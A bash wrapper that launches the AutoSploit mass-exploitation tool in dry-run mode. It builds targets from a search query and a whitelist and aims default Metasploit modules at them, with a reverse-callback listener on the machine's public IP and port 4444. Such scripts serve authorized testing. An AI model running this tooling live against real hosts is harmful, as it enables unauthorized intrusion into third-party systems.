#!/usr/bin/env bash


if [[ $# -lt 2 ]]; then
    echo "Syntax:"
    echo -e "\t./dryrun_autosploit.sh <whitelist.txt> <search_query>"
fi

WHITELIST=$1
SEARCH_QUERY=$2
LPORT=4444

LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
TIMESTAMP=`date +%s`


echo "python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite \
    --whitelist $WHITELIST -e \
    -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT \
    --exploit-file-to-use etc/json/default_modules.json \
    --dry-run"

python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite \
    --whitelist $WHITELIST -e \
    -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT \
    --exploit-file-to-use etc/json/default_modules.json \
    --dry-run
